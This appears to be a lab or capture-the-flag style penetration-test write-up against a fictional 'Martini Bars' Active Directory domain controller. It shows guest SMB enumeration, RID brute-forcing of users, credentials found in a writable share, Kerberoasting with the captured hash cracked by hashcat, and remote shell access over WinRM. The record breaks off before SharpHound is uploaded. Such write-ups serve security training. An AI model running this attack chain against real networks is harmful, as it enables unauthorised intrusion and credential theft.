# Objective and scope

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.

The client has provided you with VPN access to their internal network, but no credentials.

# Host file setup

```python
sudo nxc smb 10.1.33.56 --generate-hosts-file /etc/hosts
[sudo] password for kali:  
SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
```

- SMB Signing disabled
- Windows 11 server 2025

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT DC01.DRY.MARTINI.BARS                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 17:10 +0100
Nmap scan report for DC01.DRY.MARTINI.BARS (10.1.33.56)
Host is up (0.097s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49664/tcp open  unknown
49667/tcp open  unknown
49672/tcp open  unknown
49679/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.88 seconds
```
Ldap is also open but for some reason Nmap missed it!

## Nmap
```python
nmap -p 53,88,135,139,389,445,464,3268,3269,3389,5985 -A --min-rate=2000 -sT dc01.dry.martini.bars   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 17:13 +0100
Nmap scan report for dc01.dry.martini.bars (10.1.33.56)
Host is up (0.096s latency).
rDNS record for 10.1.33.56: DC01.DRY.MARTINI.BARS

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 16:13:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: DRY
|   NetBIOS_Domain_Name: DRY
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: DRY.MARTINI.BARS
|   DNS_Computer_Name: DC01.DRY.MARTINI.BARS
|   Product_Version: 10.0.26100
|_  System_Time: 2026-05-15T16:13:58+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.DRY.MARTINI.BARS
| Not valid before: 2026-01-16T01:19:23
|_Not valid after:  2026-07-18T01:19:23
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=5/15%Time=6A07463E%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```


# SMB (445)
Null auth is enabled but im not able to use it to enumerate users or shares

## Guest access
```python
nxc smb dc01.dry.martini.bars -u 'Guest' -p ''             
SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\Guest:
```
As seen here the guest account is enabled!

### Shares
```python
nxc smb dc01.dry.martini.bars -u 'Guest' -p '' --shares
SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\Guest: 
SMB         10.1.33.56      445    DC01             [*] Enumerated shares
SMB         10.1.33.56      445    DC01             Share           Permissions     Remark
SMB         10.1.33.56      445    DC01             -----           -----------     ------
SMB         10.1.33.56      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.33.56      445    DC01             C$                              Default share
SMB         10.1.33.56      445    DC01             IPC$            READ            Remote IPC
SMB         10.1.33.56      445    DC01             NETLOGON                        Logon server share 
SMB         10.1.33.56      445    DC01             notes           READ,WRITE      
SMB         10.1.33.56      445    DC01             SYSVOL                          Logon server share
```
Read and write on the notes share, this is making me think of a watering hole attack!

### Users
```python
nxc smb dc01.dry.martini.bars -u 'Guest' -p '' --rid-brute 20000       
SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\Guest: 
SMB         10.1.33.56      445    DC01             498: DRY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.33.56      445    DC01             500: DRY\Administrator (SidTypeUser)
SMB         10.1.33.56      445    DC01             501: DRY\Guest (SidTypeUser)
SMB         10.1.33.56      445    DC01             502: DRY\krbtgt (SidTypeUser)
SMB         10.1.33.56      445    DC01             512: DRY\Domain Admins (SidTypeGroup)
SMB         10.1.33.56      445    DC01             513: DRY\Domain Users (SidTypeGroup)
SMB         10.1.33.56      445    DC01             514: DRY\Domain Guests (SidTypeGroup)
SMB         10.1.33.56      445    DC01             515: DRY\Domain Computers (SidTypeGroup)
SMB         10.1.33.56      445    DC01             516: DRY\Domain Controllers (SidTypeGroup)
SMB         10.1.33.56      445    DC01             517: DRY\Cert Publishers (SidTypeAlias)
SMB         10.1.33.56      445    DC01             518: DRY\Schema Admins (SidTypeGroup)
SMB         10.1.33.56      445    DC01             519: DRY\Enterprise Admins (SidTypeGroup)
SMB         10.1.33.56      445    DC01             520: DRY\Group Policy Creator Owners (SidTypeGroup)
SMB         10.1.33.56      445    DC01             521: DRY\Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.33.56      445    DC01             522: DRY\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.1.33.56      445    DC01             525: DRY\Protected Users (SidTypeGroup)
SMB         10.1.33.56      445    DC01             526: DRY\Key Admins (SidTypeGroup)
SMB         10.1.33.56      445    DC01             527: DRY\Enterprise Key Admins (SidTypeGroup)
SMB         10.1.33.56      445    DC01             528: DRY\Forest Trust Accounts (SidTypeGroup)
SMB         10.1.33.56      445    DC01             529: DRY\External Trust Accounts (SidTypeGroup)
SMB         10.1.33.56      445    DC01             553: DRY\RAS and IAS Servers (SidTypeAlias)
SMB         10.1.33.56      445    DC01             571: DRY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.1.33.56      445    DC01             572: DRY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.1.33.56      445    DC01             1000: DRY\DC01$ (SidTypeUser)
SMB         10.1.33.56      445    DC01             1101: DRY\DnsAdmins (SidTypeAlias)
SMB         10.1.33.56      445    DC01             1102: DRY\DnsUpdateProxy (SidTypeGroup)
SMB         10.1.33.56      445    DC01             1104: DRY\mprice (SidTypeUser)
SMB         10.1.33.56      445    DC01             1105: DRY\athena.t0 (SidTypeUser)
SMB         10.1.33.56      445    DC01             1106: DRY\ATHENA_SVC (SidTypeUser)
```
Ive managed to get the users, but now ill adapt this command slightly to export them to a file

```python
nxc smb dc01.dry.martini.bars -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```
This command manipulated the output and placed the output into a users.txt file

```python
cat users.txt       
Administrator
Guest
krbtgt
DC01$
mprice
athena.t0
ATHENA_SVC
```
Now i have some users it might be worth trying some AS-REP roasting

AS-REP roasting failed!

# `notes` share

I have read and write access on this share

```python
smbclient //dc01.dry.martini.bars/notes -U 'Guest'%''                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 15 17:18:53 2026
  ..                                DHS        0  Sat Jan 17 16:38:33 2026
  notes.txt                           A      129  Sat Jan 17 16:38:47 2026

		7731967 blocks of size 4096. 1522701 blocks available
smb: \> get notes.txt 
getting file \notes.txt of size 129 as notes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```

```python
cat notes.txt 
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:*martini*
```
Looks like ive found some credentials

```python
nxc ldap dc01.dry.martini.bars -u mprice -p '*martini*'                                   
LDAP        10.1.33.56      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.1.33.56      389    DC01             [+] DRY.MARTINI.BARS\mprice:*martini*
```
The credentials are valid, but i also think it might be worth trying a watering hole attack

Watering hole attack failed!

Bloodhound collection also failed!

# Kerberoasting leads to user compromise!

Now i have valid credentials i can try some kerberoasting

```python
nxc ldap dc01.dry.martini.bars -u mprice -p '*martini*' --kerberoasting kerb.hash                  
LDAP        10.1.33.56      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.1.33.56      389    DC01             [+] DRY.MARTINI.BARS\mprice:*martini* 
LDAP        10.1.33.56      389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.33.56      389    DC01             [*] Total of records returned 1
LDAP        10.1.33.56      389    DC01             [*] sAMAccountName: ATHENA_SVC, memberOf: ['CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS', 'CN=Remote Desktop Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS'], pwdLastSet: 2026-01-20 18:20:32.856622, lastLogon: <never>
LDAP        10.1.33.56      389    DC01             $krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\ATHENA_SVC*$2d2bf48620242e670d39cdd611d08d00$4c7040310c32cc96b14b8db348417c10f78713a54d7ea68c877f41a809b5d4a78a74c33c8bdf293238a9a283c518c0f69ede40c813426a0ddb8aae57632db0062f8eff01190f6f7f6e9ae03930a942e9e18e463e2c09dd3074a74f377667259f8a8ccc49da751156bbba223bf705b7020d8fee54b451a314e398c0dfa9bd92f0b8a90973f50343c262483847c81a11886c5d77c70e465e6ff55a49a431a29cfc10a0b25146007aa596ae335767524e0b2f4002823ad48e4f0203ad052721b0f02707bc79f6a6392b6ff49cf5419a9c45772ad85d6836c34b57cc560e9c550010b1270fca98c57e44c7ca6aedd0bf44cd5fbfd6a1feb30e66b08df3c1ff4a9ec5e50bb330d382af86a8417139cf94be18c20038fd6cd792a7ed74ec4036d0d0558d41b0ced268346c74f3453b06d76ebad0838b7d442407674fd6a53574ba046ede7f04cb001b0cae8df386990244fd4bc64d8097ecdf415e381419348972e0723f2ce72909a82d7278f00e1398da9b3c3d45176f0841d37619177d9a6aeb8b93e4874d002979c83e36954f95f3810e7e966e2e18e47b8e179244e2718e6911e1296407a1f76ce09412d1f33fbdef3b0013fb994663aa92f6ab043ae533e839d9c7bb39e4c5cee3a3e344643fc250c78c878e1d0ec33727cce55f17f248e2ca5c85cdbeb7c00a574da0a79be4ff6aea3af0171c442f20571de22355469ccef45d42b2eab868ab2abee1b8aeec8400eb8566a6636ee2ea60b6c2214e907cd4ef08c89545114837853e189b2963c775eb7a38ffe4bd732743143f11e0cb1e8d10c6ea395d128a3cb3319bd2cb784bdfaf956e214899aaecc8b0f2410ca7d1aba2769c5689c7c9eebd2a415477983f96832d58a45fe81f61cc832e28b96b052d4b3ea2f9903745980a9bb6c43f597ce467b651331a37ece4a5b18ccc764012016f831a70783b06dbc2971855a4ad31ebc661334f8fe3eff33ba78f4585b941e8dfa86337d35971a6878b6cc96b45bd6f9f75f916f7d7f1f75516f4ed4af63ee31dd3d6aff8bf6a62441e0843d7a28b1c3fb38491f55985c7a35c3b150062cac5f82004dce52ea4aa9d0fb80e8e0783664eb35c26c72b513aa4c376392db350334bf3c285a74392b699c48e1d479c03e7040a0a248bcfdb1e06a2ed5bc691a3d77d91deff71760ff4d1789da7e01cc0aaa483b17d428c4539f880a0fcf385bc0780016241a47032f3230f35a9c9bec726c5e09976a8a344fbc8091d81ce6371bba70956b68d0e2c4cf79d7126fda441feff65aa5718f3314dd4231334e677de73bd5d235a1f8d407eb1bf9eb737b5b4c19bf8847b062b410fab48516dd4a2537c2a94fb3736f10b753a55f7b12dc04dc2658bab4052af665ad8049f32887fa094f89c2952c6d0d369b60020b4e7066278ce03d847919b405f62d745fe7feee3311b5dd13a293817593d27532ad1cc1e77f19e301cbd2e8f2476b59cb89f817ac0001cb063ed78c60a8d52a4ae31b7118d07
```
I have a hash for the user `athena_svc` i can try to crack

## Cracking the hash

```python
hashcat kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\ATHENA_SVC*$2d2bf48620242e670d39cdd611d08d00$4c7040310c32cc96b14b8db348417c10f78713a54d7ea68c877f41a809b5d4a78a74c33c8bdf293238a9a283c518c0f69ede40c813426a0ddb8aae57632db0062f8eff01190f6f7f6e9ae03930a942e9e18e463e2c09dd3074a74f377667259f8a8ccc49da751156bbba223bf705b7020d8fee54b451a314e398c0dfa9bd92f0b8a90973f50343c262483847c81a11886c5d77c70e465e6ff55a49a431a29cfc10a0b25146007aa596ae335767524e0b2f4002823ad48e4f0203ad052721b0f02707bc79f6a6392b6ff49cf5419a9c45772ad85d6836c34b57cc560e9c550010b1270fca98c57e44c7ca6aedd0bf44cd5fbfd6a1feb30e66b08df3c1ff4a9ec5e50bb330d382af86a8417139cf94be18c20038fd6cd792a7ed74ec4036d0d0558d41b0ced268346c74f3453b06d76ebad0838b7d442407674fd6a53574ba046ede7f04cb001b0cae8df386990244fd4bc64d8097ecdf415e381419348972e0723f2ce72909a82d7278f00e1398da9b3c3d45176f0841d37619177d9a6aeb8b93e4874d002979c83e36954f95f3810e7e966e2e18e47b8e179244e2718e6911e1296407a1f76ce09412d1f33fbdef3b0013fb994663aa92f6ab043ae533e839d9c7bb39e4c5cee3a3e344643fc250c78c878e1d0ec33727cce55f17f248e2ca5c85cdbeb7c00a574da0a79be4ff6aea3af0171c442f20571de22355469ccef45d42b2eab868ab2abee1b8aeec8400eb8566a6636ee2ea60b6c2214e907cd4ef08c89545114837853e189b2963c775eb7a38ffe4bd732743143f11e0cb1e8d10c6ea395d128a3cb3319bd2cb784bdfaf956e214899aaecc8b0f2410ca7d1aba2769c5689c7c9eebd2a415477983f96832d58a45fe81f61cc832e28b96b052d4b3ea2f9903745980a9bb6c43f597ce467b651331a37ece4a5b18ccc764012016f831a70783b06dbc2971855a4ad31ebc661334f8fe3eff33ba78f4585b941e8dfa86337d35971a6878b6cc96b45bd6f9f75f916f7d7f1f75516f4ed4af63ee31dd3d6aff8bf6a62441e0843d7a28b1c3fb38491f55985c7a35c3b150062cac5f82004dce52ea4aa9d0fb80e8e0783664eb35c26c72b513aa4c376392db350334bf3c285a74392b699c48e1d479c03e7040a0a248bcfdb1e06a2ed5bc691a3d77d91deff71760ff4d1789da7e01cc0aaa483b17d428c4539f880a0fcf385bc0780016241a47032f3230f35a9c9bec726c5e09976a8a344fbc8091d81ce6371bba70956b68d0e2c4cf79d7126fda441feff65aa5718f3314dd4231334e677de73bd5d235a1f8d407eb1bf9eb737b5b4c19bf8847b062b410fab48516dd4a2537c2a94fb3736f10b753a55f7b12dc04dc2658bab4052af665ad8049f32887fa094f89c2952c6d0d369b60020b4e7066278ce03d847919b405f62d745fe7feee3311b5dd13a293817593d27532ad1cc1e77f19e301cbd2e8f2476b59cb89f817ac0001cb063ed78c60a8d52a4ae31b7118d07:1dirtymartini
```
The hash cracked!

```python
athena_svc:1dirtymartini
```
Ill now validate these credentials!

```python
nxc smb dc01.dry.martini.bars -u athena_svc -p '1dirtymartini'         
SMB         10.1.33.56      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\athena_svc:1dirtymartini
```
This user is now compromised!

## Access over WINRM and RDP 

```python
nxc winrm dc01.dry.martini.bars -u athena_svc -p '1dirtymartini' 
WINRM       10.1.33.56      5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) 
WINRM       10.1.33.56      5985   DC01             [+] DRY.MARTINI.BARS\athena_svc:1dirtymartini (Pwn3d!)
```
This user has access over WINRM

```python
nxc rdp dc01.dry.martini.bars -u athena_svc -p '1dirtymartini' 
RDP         10.1.33.56      3389   DC01             [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (nla:True)
RDP         10.1.33.56      3389   DC01             [+] DRY.MARTINI.BARS\athena_svc:1dirtymartini (Pwn3d!)
```
This user also has access over RDP

# Using sharphound to collect bloodhound data

Since regular bloodhound collection failed ill use sharphound now i have WINRM access

```python
evil-winrm -i dc01.dry.martini.bars -u 'athena_svc' -p '1dirtymartini'               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents>
```
I now have access over WINRM, so now i can upload sharphound





